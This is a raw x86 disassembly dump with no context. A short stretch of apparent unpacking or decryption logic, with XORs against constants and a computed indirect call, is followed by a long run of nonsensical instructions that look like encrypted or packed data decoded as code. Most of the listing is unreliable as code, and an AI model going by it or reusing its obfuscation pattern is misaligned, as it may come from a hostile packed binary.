  40cb7e:	ss in  eax,0xbe
  40cb81:	xchg   esp,eax
  40cb82:	jmp    0x179a6904
  40cb87:	sti    
  40cb88:	push   ebx
  40cb89:	inc    esi
  40cb8a:	ret    0x578c
  40cb8d:	imul   esi,DWORD PTR [edx-0x1d],0xffffffc0
  40cb91:	sub    ebx,0x356c308
  40cb97:	(bad)  
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x6d]
  40cbfc:	fs enter 0x62c1,0x8c
  40cc01:	jle    0x40cc81
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	jno    0x40cc2b
  40cc09:	imul   BYTE PTR [edx-0x69eee3cd]
  40cc0f:	mov    dh,0xae
  40cc11:	ins    DWORD PTR es:[edi],dx
  40cc12:	jg     0x40cc8f
  40cc14:	sbb    eax,0xe876c727
  40cc19:	sbb    ah,BYTE PTR [edi-0xb]
  40cc1c:	xor    al,0x8a
  40cc1e:	jg     0x40cbb7
  40cc20:	dec    esp
  40cc21:	dec    ebx
  40cc22:	adc    al,0x24
  40cc24:	sub    ch,bl
  40cc26:	mov    dl,0xbb
  40cc28:	cli    
  40cc29:	or     ecx,ebp
  40cc2b:	or     eax,0x6cab866b
  40cc30:	das    
  40cc31:	push   edx
  40cc32:	hlt    
  40cc33:	mov    ?,WORD PTR [ecx-0x1b22de80]
  40cc39:	and    dh,BYTE PTR [ebx-0x42]
  40cc3c:	mov    esp,0x7571e9fe
  40cc41:	push   es
  40cc42:	enter  0xc4bb,0x60
  40cc46:	shl    ch,1
  40cc48:	bt     DWORD PTR [ecx-0x472982d2],edx
  40cc4f:	xchg   ebx,eax
  40cc50:	aam    0xd8
  40cc52:	xchg   ebx,eax
  40cc53:	cwde   
  40cc54:	and    DWORD PTR [edx+0x7c3dc7a9],ebp
  40cc5a:	mov    al,0xd9
  40cc5c:	xor    ebx,DWORD PTR [ebx+0x61]
  40cc5f:	(bad)  
  40cc60:	aad    0x8c
  40cc62:	test   DWORD PTR [esi-0x5ac04a58],eax
  40cc68:	cwde   
  40cc69:	int3   
  40cc6a:	leave  
  40cc6b:	std    
  40cc6c:	data16 fdivr QWORD PTR [esi]
  40cc6f:	xchg   BYTE PTR [ecx+0x4d],cl
  40cc72:	xlat   BYTE PTR ds:[ebx]
  40cc73:	dec    ebx
  40cc74:	cmp    ah,ah
  40cc76:	call   0xc8a4:0xbbbcc58e
  40cc7d:	or     BYTE PTR [esi+ebx*2],ah
  40cc80:	(bad)  
  40cc82:	mov    al,0x6d
  40cc84:	aaa    
  40cc85:	aam    0x71
  40cc87:	sub    ecx,0x2b
  40cc8a:	pop    ebx
  40cc8b:	xchg   esp,eax
  40cc8c:	call   0x5f7d:0x84402ec7
  40cc93:	jmp    0xa83f:0x195fafdc
  40cc9a:	inc    esp
  40cc9b:	add    BYTE PTR ds:0x68861045,ch
  40cca1:	loop   0x40cc8b
  40cca3:	or     eax,0x7bce7f0
  40cca8:	ins    DWORD PTR es:[edi],dx
  40cca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccaa:	sbb    al,0xcb
  40ccac:	xchg   edi,eax
  40ccad:	aas    
  40ccae:	popa   
  40ccaf:	adc    DWORD PTR [edi],edi
  40ccb1:	pop    ebp
  40ccb2:	in     al,dx
  40ccb3:	pop    edi
  40ccb4:	lods   al,BYTE PTR ds:[esi]
  40ccb5:	and    bl,BYTE PTR [edx+0x15f4a9e3]
  40ccbb:	jno    0x40cce5
  40ccbd:	adc    al,0x4f
  40ccbf:	xchg   ebx,eax
  40ccc0:	xor    ecx,esi
  40ccc2:	aaa    
  40ccc3:	retf   
  40ccc4:	mov    bl,0xed
  40ccc6:	pop    edx
  40ccc7:	push   esp
  40ccc8:	les    ebx,FWORD PTR [ebx-0x5d84d11e]
  40ccce:	loop   0x40cc90
  40ccd0:	pop    edi
  40ccd1:	pop    ebx
  40ccd2:	lock in al,0x8a
  40ccd5:	(bad)  
  40ccd6:	pop    eax
  40ccd7:	dec    ebp
  40ccd8:	fadd   DWORD PTR [edi-0x34]
  40ccdb:	jl     0x40cc66
  40ccdd:	jns    0x40cd04
  40ccdf:	inc    ecx
  40cce0:	xor    al,0x4e
  40cce2:	repz retf 
  40cce4:	es pop ds
  40cce6:	imul   esp,DWORD PTR [eax],0xffffffba
  40cce9:	mov    esi,0xecfc4b0d
  40ccee:	int3   
  40ccef:	retf   0xaf20
  40ccf2:	or     ebp,edx
  40ccf4:	(bad)  
  40ccf5:	(bad)  
  40ccf7:	loopne 0x40cc97
  40ccf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccfa:	cmp    al,0x35
  40ccfc:	pop    ss
  40ccfd:	imul   BYTE PTR [esi+0x73]
  40cd00:	mov    WORD PTR [ecx],?
  40cd02:	mov    dl,0x27
  40cd04:	adc    al,0xbf
  40cd06:	mov    ebp,0x1efa35c6
  40cd0b:	test   BYTE PTR [ecx-0x66aa7c6],dl
  40cd11:	jge    0x40ccd4
  40cd13:	push   esi
  40cd14:	push   ebp
  40cd15:	dec    ebp
  40cd16:	lds    esp,FWORD PTR [ebp+ebx*1-0x71]
  40cd1a:	cdq    
  40cd1b:	xor    eax,0x50a0101d
  40cd20:	xor    al,0x9
  40cd22:	or     DWORD PTR [edi],esi
  40cd24:	add    BYTE PTR [esi-0x279d0a81],al
  40cd2a:	and    BYTE PTR [edx-0x36],dh
  40cd2d:	aad    0x4d
  40cd2f:	dec    eax
  40cd30:	jmp    0x40cd28
  40cd32:	add    DWORD PTR [edx-0x4a],eax
  40cd35:	scas   eax,DWORD PTR es:[edi]
  40cd36:	cmp    DWORD PTR [ebx-0x22],ebx
  40cd39:	xor    al,0xa0
  40cd3b:	fild   WORD PTR [esi]
  40cd3d:	lods   al,BYTE PTR ds:[esi]
  40cd3e:	add    eax,0x693c7ec7
  40cd43:	jne    0x40cd49
  40cd45:	xchg   ebp,eax
  40cd46:	mov    WORD PTR [esi-0x58],ss
  40cd49:	ss retf 0x8806
  40cd4d:	jns    0x40cd5a
  40cd4f:	loop   0x40ccd8
  40cd51:	jne    0x40cd40
  40cd53:	jle    0x40cdcc
  40cd55:	xor    BYTE PTR [ecx+eiz*2+0x25348d8e],bl
  40cd5c:	outs   dx,DWORD PTR ds:[esi]
  40cd5d:	daa    
  40cd5e:	retf   
  40cd5f:	mov    cl,0xff
  40cd61:	and    eax,0xd47dbc4f
  40cd66:	mov    ebp,0x82862d2d
  40cd6b:	push   0xffffff9f
  40cd6d:	jmp    eax
  40cd6f:	daa    
  40cd70:	cdq    
  40cd71:	pushaw 
  40cd73:	pop    ebp
  40cd74:	std    
  40cd75:	cmp    eax,DWORD PTR [edx-0x9]
  40cd78:	mov    ds:0x28fdd6e8,al
  40cd7d:	jno    0x40cd11
  40cd7f:	iret   
  40cd80:	cs pop bx
  40cd83:	mov    ds:0xfda02c2b,al
  40cd88:	int    0xa1
  40cd8a:	jmp    0x1e38fdcd
  40cd8f:	outs   dx,DWORD PTR ds:[esi]
  40cd90:	mov    edx,0x9e5740ad
  40cd95:	mov    ecx,0x5fe4b51c
  40cd9a:	ficomp DWORD PTR [edi+0x7c]
  40cd9d:	mov    al,0x7d
  40cd9f:	js     0x40cd64
  40cda1:	pop    esi
  40cda2:	ror    BYTE PTR [eax+0x6b],0x10
  40cda6:	push   0xe
  40cda8:	fnstenv [eax]
  40cdaa:	dec    edi
  40cdab:	cmp    ebx,DWORD PTR [edx+0x58]
  40cdae:	mov    edi,edi
  40cdb0:	popf   
  40cdb1:	jns    0x40cd72
  40cdb3:	pop    esi
  40cdb4:	push   0x5f
  40cdb6:	mov    edi,0x4da9e589
  40cdbb:	mov    eax,0x53599949
  40cdc0:	jl     0x40cd70
  40cdc2:	adc    BYTE PTR [ebx],bl
  40cdc4:	xor    BYTE PTR [ebp+0x6ad029c9],dl
  40cdca:	out    dx,al
  40cdcb:	fmul   DWORD PTR [esi-0x3887e3a7]
  40cdd1:	and    eax,0xea997919
  40cdd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdd7:	es sub ebp,ebp
  40cdda:	sar    DWORD PTR [esi],0x89
  40cddd:	arpl   bx,cx
  40cddf:	push   esp
  40cde0:	mov    DWORD PTR [ecx+esi*4+0x61],ecx
  40cde4:	push   ds
  40cde5:	sub    DWORD PTR [ebx],0x71
  40cde8:	(bad)
  40cdeb:	dec    eax
  40cdec:	inc    esi
  40cded:	mov    eax,?
  40cdef:	pop    edi
  40cdf0:	stos   DWORD PTR es:[edi],eax
  40cdf1:	(bad)  
  40cdf2:	enter  0x594a,0x8
  40cdf6:	bound  esp,QWORD PTR [edi+0x21815ae]
  40cdfc:	es inc ebx
  40cdfe:	out    0xa7,eax
  40ce00:	call   0xf63857c1
  40ce05:	inc    esp
  40ce06:	dec    eax
  40ce07:	push   ebx
  40ce08:	sbb    al,0x18
  40ce0a:	or     edx,ecx
  40ce0c:	or     eax,0xd18581fe
  40ce11:	rol    BYTE PTR [ebx-0x1d],cl
  40ce14:	cs xchg ch,dh
  40ce17:	dec    ebp
  40ce18:	and    dh,ch
  40ce1a:	test   al,0x39
  40ce1c:	(bad)  
  40ce1d:	std    
  40ce1e:	rcr    BYTE PTR [edx],0x1f
  40ce21:	xchg   esp,eax
  40ce22:	iret   
  40ce23:	inc    eax
  40ce24:	into   
  40ce25:	push   ebp
  40ce26:	stos   BYTE PTR es:[edi],al
  40ce27:	fsub   st,st(0)
  40ce29:	in     eax,dx
  40ce2a:	mov    ch,0x5
  40ce2c:	xor    BYTE PTR [ebp-0x3e],bh
  40ce2f:	int    0x2f
  40ce31:	iret   
  40ce32:	jl     0x40cddb
  40ce34:	inc    esp
  40ce35:	mov    edx,0xaedcb8cc
  40ce3a:	inc    ecx
  40ce3b:	inc    edx
  40ce3c:	jl     0x40ce0b
  40ce3e:	sbb    bl,BYTE PTR [eax-0x187f960d]
  40ce44:	xor    ecx,DWORD PTR [eax+ecx*2+0x70670111]
  40ce4b:	cmc    
  40ce4c:	call   0x5ee9:0xcb87d92b
  40ce53:	add    al,BYTE PTR [eax]
  40ce55:	add    BYTE PTR [ebx-0x3],dl
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	into   
  40ce63:	shl    DWORD PTR ds:0x7e8b2c72,1
  40ce69:	jle    0x40cea3
  40ce6b:	jl     0x40ceeb
  40ce6d:	jle    0x40ced1
  40ce6f:	std    
  40ce70:	shl    bl,cl
  40ce72:	xchg   edi,eax
  40ce73:	jp     0x40ce50
  40ce75:	push   ebx
  40ce76:	in     al,dx
  40ce77:	or     eax,0xbe1efea3
  40ce7c:	loop   0x40cee1
  40ce7e:	int3   
  40ce7f:	mov    ds,ebp
  40ce81:	inc    ebp
  40ce82:	jo     0x40ce07
  40ce84:	test   al,0xc9
  40ce86:	gs adc esp,eax
  40ce89:	ins    DWORD PTR es:[edi],dx
  40ce8a:	dec    edi
  40ce8b:	ss addr16 xchg ebp,eax
  40ce8e:	fnsave [ecx+0x46]
  40ce91:	lods   eax,DWORD PTR ds:[esi]
  40ce92:	and    ecx,DWORD PTR [eax+0x1b4b27bc]
  40ce98:	outs   dx,DWORD PTR ds:[esi]
  40ce99:	pop    esp
  40ce9a:	shl    BYTE PTR [edi-0x6],0x7
  40ce9e:	mov    esi,0x1c715c1
  40cea3:	stos   DWORD PTR es:[edi],eax
  40cea4:	aas    
  40cea5:	inc    edi
  40cea6:	dec    esp
  40cea7:	cmp    DWORD PTR [esp+ecx*4+0x45b887f9],ebx
  40ceae:	outs   dx,BYTE PTR ds:[esi]
  40ceaf:	dec    ebp
  40ceb0:	jmp    0x40cec0
  40ceb2:	jle    0x40ceb5
  40ceb4:	pop    ebx
  40ceb5:	mov    fs,WORD PTR [esi-0x11b8fe1b]
  40cebb:	sbb    al,0x52
  40cebd:	jmp    0x26e7:0x77c6aa4a
  40cec4:	clc    
  40cec5:	iret   
  40cec6:	push   ebx
  40cec7:	repz test BYTE PTR [eax-0x601ad40d],ch
  40cece:	or     al,0x1e
  40ced0:	sub    edx,DWORD PTR [ecx-0x56b574e8]
  40ced6:	popa   
  40ced7:	dec    edx
  40ced8:	pop    dx
  40ceda:	stos   DWORD PTR es:[edi],eax
  40cedb:	xchg   ebp,eax
  40cedc:	cs loopne 0x40cf09
  40cedf:	or     ch,al
  40cee1:	add    edx,edx
  40cee3:	repnz outs dx,BYTE PTR ds:[esi]
  40cee5:	and    eax,0xd08a546c
  40ceea:	dec    edx
  40ceeb:	cmp    DWORD PTR [esi],ebp
  40ceed:	pop    ebx
  40ceee:	hlt    
  40ceef:	lea    ebx,[eax]
  40cef1:	je     0x40cf65
  40cef3:	fsubr  DWORD PTR [ebx]
  40cef5:	ins    DWORD PTR es:[edi],dx
  40cef6:	pop    edx
  40cef7:	and    eax,0x5b03d301
  40cefc:	mov    ds:0x27b67932,al
  40cf01:	pop    ss
  40cf02:	enter  0x6fb3,0x38
  40cf06:	lds    ebx,FWORD PTR [edi]
  40cf08:	mov    ah,0xdb
  40cf0a:	sbb    BYTE PTR [edi+0x19],0xce
  40cf0e:	call   0x4983:0x3f62b144
  40cf15:	imul   esi,DWORD PTR [ecx+0x7a700566],0xaf81ee63
  40cf1f:	ss pop esp
  40cf21:	ss test al,0x35
  40cf24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf25:	and    al,BYTE PTR [edx-0x36b3e74e]
  40cf2b:	mov    cl,0xaf
  40cf2d:	js     0x40cfa1
  40cf2f:	ins    DWORD PTR es:[edi],dx
  40cf30:	pop    ecx
  40cf31:	xor    al,0xb5
  40cf33:	cmp    ecx,DWORD PTR [ebp-0x23d31cbf]
  40cf39:	cli    
  40cf3a:	out    0x58,al
  40cf3c:	arpl   si,ax
  40cf3e:	out    0xbf,al
  40cf40:	dec    ebp
  40cf41:	xchg   BYTE PTR [ebx+0x5e],al
  40cf44:	xchg   edx,eax
  40cf45:	mov    cl,0x45
  40cf47:	int    0x5e
  40cf49:	inc    esi
  40cf4a:	or     al,0x61
  40cf4c:	loop   0x40cf2d
  40cf4e:	adc    eax,0xc35b4f6b
  40cf53:	jmp    0x28d312cd
  40cf58:	in     al,0x5e
  40cf5a:	cmc    
  40cf5b:	shl    BYTE PTR [eax],0x99
  40cf5e:	jle    0x40cf42
  40cf60:	pop    ss
  40cf61:	mov    al,fs:0x53404841
  40cf67:	push   ecx
  40cf68:	jns    0x40cf3a
  40cf6a:	xor    al,0xc9
  40cf6c:	rol    BYTE PTR [eax-0x6f],0xab
  40cf70:	pop    ebx
  40cf71:	jo     0x40cfef
  40cf73:	ja     0x40cfbf
  40cf75:	daa    
  40cf76:	mov    eax,0xb120f3d7
  40cf7b:	dec    esp
  40cf7d:	jmp    0x8b9e:0x4f6f15a3
  40cf84:	fidivr DWORD PTR [ecx]
  40cf86:	inc    esi
  40cf87:	call   0xf66f9f5b
  40cf8c:	(bad)  
  40cf8d:	sub    ebx,DWORD PTR [ebp-0x7f75b592]
  40cf93:	push   cs
  40cf94:	or     eax,0xd86b9085
  40cf99:	or     al,0x90
  40cf9b:	mov    ds:0x4d895766,al
  40cfa0:	daa    
  40cfa1:	into   
  40cfa2:	adc    BYTE PTR [esi+0xe],dl
  40cfa5:	pop    ds
  40cfa6:	(bad)  
  40cfa7:	(bad)  
  40cfa8:	fild   QWORD PTR [ecx+0x19b6df7a]
  40cfae:	xchg   BYTE PTR [esp+esi*2],al
  40cfb1:	cmp    al,0xce
  40cfb3:	push   ds
  40cfb4:	jns    0x40cf43
  40cfb6:	push   ecx
  40cfb7:	and    eax,0x6802ecd9
  40cfbc:	pop    ds
  40cfbd:	iret   
  40cfbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfbf:	and    ebp,DWORD PTR [ecx-0x5840a559]
  40cfc5:	imul   esp,DWORD PTR [esi],0xfe6edfc7
  40cfcb:	in     al,0x6e
  40cfcd:	dec    esi
  40cfce:	and    eax,DWORD PTR [ebp+0x7293bc16]
  40cfd4:	or     al,0xce
  40cfd6:	xor    bh,BYTE PTR [ebx+0x54]
  40cfd9:	je     0x40cf9a
  40cfdb:	xor    ah,ch
  40cfdd:	out    0x27,eax
  40cfdf:	div    BYTE PTR [edi+eiz*2+0x48ed4833]
  40cfe6:	mov    al,ds:0xf1044f22
  40cfeb:	jg     0x40cf7b
  40cfed:	pop    ecx
  40cfee:	std    
  40cfef:	dec    edi
  40cff0:	adc    esp,edx
  40cff2:	cmp    bh,BYTE PTR [edx+0x425a1df1]
  40cff8:	cmp    eax,0x6d4dbd02
  40cffd:	fs pop ds
  40cfff:	std    
  40d000:	cwde   
  40d001:	xchg   ebx,eax
  40d002:	or     BYTE PTR [esi],ah
  40d004:	xor    eax,0xd2505b6
  40d009:	cli    
  40d00a:	xlat   BYTE PTR ds:[ebx]
  40d00b:	jno    0x40cfea
  40d00d:	mov    cl,dh
  40d00f:	lds    ecx,FWORD PTR [eax]
  40d011:	push   0xf97751a2
  40d016:	adc    BYTE PTR [ecx+0x632f2ef7],0xd
  40d01d:	jmp    0x7e5c:0xc301c45b
  40d024:	cmp    eax,DWORD PTR [ecx+edi*4+0x2c37a18d]
  40d02b:	pop    ecx
  40d02c:	fs or  eax,0xe36e015a
  40d032:	loop   0x40d0a7
  40d034:	xchg   BYTE PTR [ebx-0x5cedc817],cl
  40d03a:	add    bl,ah
  40d03c:	mov    ebx,0x6601db0b
  40d041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d042:	nop
  40d043:	(bad)  [ebp-0xda37527]
  40d049:	cmp    ebp,esi
  40d04b:	mov    dl,0x31
  40d04d:	es pop esp
  40d04f:	push   edi
  40d050:	and    DWORD PTR [eax+0x7b],edi
  40d053:	fmul   st(1),st
  40d055:	add    al,0x71
  40d057:	sbb    ecx,ebp
  40d059:	es aam 0x29
  40d05c:	(bad)  
  40d05d:	(bad)  
  40d05e:	push   ebp
  40d05f:	adc    DWORD PTR [ebp-0x2c],ecx
  40d062:	sbb    BYTE PTR [edi-0x3c843d1f],bh
  40d068:	mov    cl,0x51
  40d06a:	jle    0x40cfee
  40d06c:	retf   
  40d06d:	jo     0x40d0c1
  40d06f:	fadd   st(6),st
  40d071:	mov    ebp,0x6c341918
  40d076:	jns    0x40d0b0
  40d078:	imul   DWORD PTR [edi+0x63]
  40d07b:	enter  0x729a,0xa2
  40d07f:	xor    eax,0xd0f14a37
  40d084:	das    
  40d085:	cmp    dh,BYTE PTR [edi+ebx*4]
  40d088:	scas   al,BYTE PTR es:[edi]
  40d089:	frstor [edx+esi*8]
  40d08c:	jb     0x40d0d6
  40d08e:	add    DWORD PTR [ebx+0x64],esp
  40d091:	inc    esp
  40d092:	scas   eax,DWORD PTR es:[edi]
  40d093:	arpl   WORD PTR [edi],sp
  40d095:	sbb    DWORD PTR [edi],ebx
  40d097:	enter  0xc490,0x2b
  40d09b:	js     0x40d050
  40d09d:	or     bl,BYTE PTR [esi+0x42]
  40d0a0:	jb     0x40d071
  40d0a2:	retf   0xdfc
  40d0a5:	ret    
  40d0a6:	xor    BYTE PTR [ecx],ch
  40d0a8:	mov    dl,0xb7
  40d0aa:	xchg   BYTE PTR [ecx+eax*1+0x3e113437],bh
  40d0b1:	xchg   bh,cl
  40d0b3:	lds    ecx,FWORD PTR [ecx-0x75]
  40d0b6:	inc    ebp
  40d0b7:	in     al,0xf
  40d0b9:	scas   eax,DWORD PTR es:[edi]
  40d0ba:	rol    DWORD PTR [ebx],0xe0
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	mov    esp,0xf6f264fe
  40d0d4:	mov    DWORD PTR [esi+0x7e],edi
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	push   ecx
  40d0dc:	rcl    DWORD PTR [esp+ebp*4-0x12],0xf3
  40d0e1:	into   
  40d0e2:	imul   esi,DWORD PTR [eax],0x194b49dd
  40d0e8:	enter  0x8249,0x6b
  40d0ec:	out    0x5b,eax
  40d0ee:	lods   eax,DWORD PTR ds:[esi]
  40d0ef:	lahf   
  40d0f0:	and    ebx,DWORD PTR [esi]
  40d0f2:	aam    0x24
  40d0f4:	inc    ecx
  40d0f5:	ret    
  40d0f6:	or     esi,ecx
  40d0f8:	js     0x40d166
  40d0fa:	add    ah,BYTE PTR [eax-0x6eedbacc]
  40d100:	mov    fs,WORD PTR [ebx]
  40d102:	mov    al,0xb8
  40d104:	jle    0x40d0da
  40d106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d107:	cmc    
  40d108:	mov    ds:0x592f4990,al
  40d10d:	jl     0x40d0f6
  40d10f:	test   eax,0x7e56c4ea
  40d114:	call   0xf42a2b
  40d119:	test   DWORD PTR [ebx],esi
  40d11b:	push   es
  40d11c:	cs mov dh,0x51
  40d11f:	ins    DWORD PTR es:[edi],dx
  40d120:	into   
  40d121:	out    dx,eax
  40d122:	aam    0x5
  40d124:	fucomi st,st(0)
  40d126:	push   cs
  40d127:	pusha  
  40d128:	cwde   
  40d129:	scas   eax,DWORD PTR es:[edi]
  40d12a:	or     BYTE PTR [edx+0x64905fd6],dh
  40d130:	jle    0x40d19b
  40d132:	int    0xe7
  40d134:	dec    eax
  40d135:	or     al,0xf3
  40d137:	(bad)
  40d13a:	call   0x9b2e:0x6f86dd62
  40d141:	or     BYTE PTR [edx-0x59c6c567],0x40
  40d148:	or     BYTE PTR [ecx+edi*2-0x79],cl
  40d14c:	xlat   BYTE PTR ds:[ebx]
  40d14d:	or     eax,0xd5dace6f
  40d152:	rcr    DWORD PTR [esi-0x2c],1
  40d155:	sub    cl,BYTE PTR [edi+0x57]
  40d158:	lock jno 0x40d10d
  40d15b:	mov    dh,0x13
  40d15d:	push   ebx
  40d15e:	sbb    edx,ebp
  40d160:	push   0xba46abdf
  40d165:	xor    al,0xb
  40d167:	push   edx
  40d168:	cld    
  40d169:	cli    
  40d16a:	bound  ebp,QWORD PTR [edi]
  40d16c:	(bad)  
  40d16d:	sbb    al,0x3e
  40d16f:	(bad)  
  40d170:	arpl   WORD PTR [ebx+ecx*1],bx
  40d173:	jmp    0x200a:0x158592e7
  40d17a:	(bad)  
  40d17b:	xor    bl,BYTE PTR [ecx+0x79]
  40d17e:	leave  
  40d17f:	fiadd  WORD PTR [esi-0x3fd75d31]
  40d185:	sbb    BYTE PTR [ecx],cl
  40d187:	xor    DWORD PTR [esi],edi
  40d189:	int    0xb
  40d18b:	inc    edx
  40d18c:	mov    bh,dh
  40d18e:	push   edi
  40d18f:	fdivr  st,st(7)
  40d191:	dec    edx
  40d192:	inc    edx
  40d193:	mul    DWORD PTR [ebx-0x4c]
  40d196:	cdq    
  40d197:	pusha  
  40d198:	dec    ebx
  40d199:	push   esp
  40d19a:	fwait
  40d19b:	iret   
  40d19c:	mov    eax,ds:0x1b06d32f
  40d1a1:	adc    eax,DWORD PTR [ebp-0x1b]
  40d1a4:	pusha  
  40d1a5:	repz (bad) 
  40d1a7:	xor    eax,0xf8f12457
  40d1ac:	loopne 0x40d205
  40d1ae:	push   ecx
  40d1af:	xor    ecx,ebx
  40d1b1:	and    BYTE PTR ss:[edi+0x4d],0xc9
  40d1b6:	xor    BYTE PTR [edx],dh
  40d1b8:	rcr    cl,cl
  40d1ba:	push   ds
  40d1bb:	pop    edi
  40d1bc:	leave  
  40d1bd:	cld    
  40d1be:	add    eax,0xb76ff80b
  40d1c3:	stos   DWORD PTR es:[edi],eax
  40d1c4:	push   0x4ff20254
  40d1c9:	cmp    DWORD PTR [ecx],ecx
  40d1cb:	adc    al,0x5
  40d1cd:	retf   
  40d1ce:	stc    
  40d1cf:	(bad)  
  40d1d0:	fwait
  40d1d1:	ins    DWORD PTR es:[edi],dx
  40d1d2:	imul   edi,DWORD PTR [ecx+ecx*2-0x62],0xffffff97
  40d1d7:	stos   DWORD PTR es:[edi],eax
  40d1d8:	mov    esi,0x2142adc1
  40d1dd:	or     al,0x1
  40d1df:	inc    eax
  40d1e0:	aad    0xa1
  40d1e2:	mov    ?,WORD PTR fs:[ebx+0x58]
  40d1e6:	and    esi,DWORD PTR ds:0xd6d010be
  40d1ec:	xchg   esp,eax
  40d1ed:	(bad)  
  40d1ee:	sub    DWORD PTR [edx],edi
  40d1f0:	and    BYTE PTR [esi],bl
  40d1f2:	push   ebx
  40d1f3:	in     eax,dx
  40d1f4:	xchg   ebx,eax
  40d1f5:	into   
  40d1f6:	add    eax,0x510d6ee7
  40d1fb:	aaa    
  40d1fc:	cdq    
  40d1fd:	sbb    ah,BYTE PTR ds:0x74566aca
  40d203:	push   0x2c
  40d205:	push   eax
  40d206:	add    cl,BYTE PTR [edx]
  40d208:	lock mov dl,0x85
  40d20b:	mov    eax,ds:0xabda9106
  40d210:	shl    esp,cl
  40d212:	cmc    
  40d213:	mov    al,0xe2
  40d215:	lahf   
  40d216:	jno    0x40d1f9
  40d218:	div    BYTE PTR [esi-0x17c7e46b]
  40d21e:	adc    BYTE PTR [edx],0x6a
  40d221:	ds (bad) 
  40d223:	fisubr DWORD PTR [eax-0xe]
  40d226:	xchg   ecx,eax
  40d227:	leave  
  40d228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d229:	push   ebx
  40d22a:	jle    0x40d2a7
  40d22c:	pop    ebx
  40d22d:	icebp  
  40d22e:	push   0x6dabbc4c
  40d233:	imul   edx,ecx,0x188c475b
  40d239:	xlat   BYTE PTR ds:[ebx]
  40d23a:	loopne 0x40d21c
  40d23c:	imul   bl
  40d23e:	pop    ebp
  40d23f:	adc    DWORD PTR [ebx+edi*2-0x3],esp
  40d243:	inc    esi
  40d244:	mov    ah,0x42
  40d246:	mov    ds:0x74b48e89,al
  40d24b:	fldcw  WORD PTR [esi+0x6517c4e4]
  40d251:	mov    cl,0x16
  40d253:	test   BYTE PTR [ecx-0x29],0x85
  40d257:	dec    eax
  40d258:	sub    BYTE PTR [edx-0x3dc053ac],bh
  40d25e:	fsubr  DWORD PTR [ebx+0x2a12bd3]
  40d264:	aam    0x6
  40d266:	cwde   
  40d267:	stc    
  40d268:	fstp   QWORD PTR [edi+edx*4-0x678aa13d]
  40d26f:	pusha  
  40d270:	std    
  40d271:	fadd   QWORD PTR [eax+0x4f]
  40d274:	cmp    eax,0xc4e51b38
  40d279:	mov    ah,dh
  40d27b:	push   edx
  40d27c:	jg     0x40d216
  40d27e:	int    0x57
  40d280:	call   0x9a9:0x4aae48f1
  40d287:	xchg   DWORD PTR [ebx],eax
  40d289:	fiadd  WORD PTR [edx-0x25]
  40d28c:	pop    ebp
  40d28d:	neg    WORD PTR [edi+0x7e]
  40d291:	(bad)  
  40d292:	out    dx,eax
  40d293:	cmc    
  40d294:	jmp    0x582f9436
  40d299:	and    DWORD PTR [ebx-0x4],eax
  40d29c:	sbb    bl,BYTE PTR [edi]
  40d29e:	adc    al,0x76
  40d2a0:	fdivr  DWORD PTR [eax-0x30]
  40d2a3:	push   ebx
  40d2a4:	mov    bh,0xdb
  40d2a6:	stos   BYTE PTR es:[edi],al
  40d2a7:	inc    esi
  40d2a8:	add    cl,BYTE PTR [edi]
  40d2aa:	ins    DWORD PTR es:[edi],dx
  40d2ab:	xor    esi,esi
  40d2ad:	and    DWORD PTR [edi],0xffffffce
  40d2b0:	fisubr WORD PTR [edi-0x6b]
  40d2b3:	out    dx,al
  40d2b4:	outs   dx,DWORD PTR ds:[esi]
  40d2b5:	cwde   
  40d2b6:	out    dx,al
  40d2b7:	sub    al,0x9
  40d2b9:	dec    ecx
  40d2ba:	pushf  
  40d2bb:	mov    al,ds:0x363f3ffa
  40d2c0:	dec    ecx
  40d2c1:	out    0x5a,eax
  40d2c3:	push   0x38
  40d2c5:	push   ss
  40d2c6:	cmp    al,0xf4
  40d2c8:	sahf   
  40d2c9:	xor    BYTE PTR [edx],0xf4
  40d2cc:	xchg   esi,eax
  40d2cd:	in     eax,dx
  40d2ce:	sub    DWORD PTR [edx+ecx*4+0x79],eax
  40d2d2:	cwde   
  40d2d3:	push   edi
